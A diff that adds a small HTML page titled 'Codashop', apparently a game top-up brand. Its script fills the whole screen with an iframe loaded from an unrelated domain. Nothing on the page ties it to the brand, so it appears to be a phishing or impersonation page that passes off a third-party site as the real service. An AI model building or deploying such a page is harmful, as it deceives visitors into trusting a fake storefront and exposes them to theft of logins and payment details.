@@ -1,0 +1,22 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Codashop</title>
+<link rel="stylesheet" href="https://db.webpren.com/drive/bootstrap.min.css">
+</head>
+<body>
+<div class="embed-responsive embed-responsive-16by9" style="height:100vh" id="iframeContainer"></div>
+<script>
+const iframeURL = 'https://madrx580.undigon.com/sc/';
+const iframeContainer = document.getElementById('iframeContainer');
+const iframe = document.createElement('iframe');
+iframe.src = iframeURL;
+iframe.className = 'embed-responsive-item';
+iframe.allowFullscreen = true;
+iframeContainer.appendChild(iframe);
+</script>
+</body>
+</html>
